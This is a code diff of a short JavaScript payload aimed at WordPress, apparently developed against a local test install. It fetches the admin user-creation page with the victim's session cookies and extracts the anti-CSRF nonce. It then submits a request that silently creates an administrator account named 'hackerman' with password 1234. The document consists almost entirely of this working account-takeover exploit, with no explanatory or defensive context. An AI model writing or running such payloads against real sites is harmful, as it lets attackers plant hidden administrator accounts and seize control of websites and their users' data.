@@ -1,17 +1,24 @@
 
-var csrf = new XMLHttpRequest();
-  csrf.onreadystatechange = function() {
+var target = "http://localhost/arash";
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
     if (this.readyState == 4 && this.status == 200) {
       const parser = new DOMParser();
-      const htmlDocument = parser.parseFromString(this.responseText);
+      const htmlDocument = parser.parseFromString(this.responseText, "text/html");
       const token = htmlDocument.getElementById("_wpnonce_create-user").value;
       alert(token)
+      let rq = new XMLHttpRequest();
+      rq.open("POST", `${target}/wp-admin/user-new.php`, true);
+       rq.withCredentials = true;
+       rq.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+     let data = `action=createuser&_wpnonce_create-user=${token}&_wp_http_referer=%2Farash%2Fwp-admin%2Fuser-new.php&user_login=hackerman&email=test1%40test.com&first_name=&last_name=&url=&pass1=1234&pass2=1234&pw_weak=on&send_user_notification=1&role=administrator&createuser=Add+New+User`;
+     rq.send(data);
     }
   };
-  csrf.withCredentials = true
-  csrf.open("GET", "http://localhost/arash/wp-admin/user-new.php", true);
-  csrf.send();
-}
+  xhttp.withCredentials = true
+  xhttp.open("GET", `${target}/wp-admin/user-new.php`, true);
+  xhttp.send();
+
 
 
 
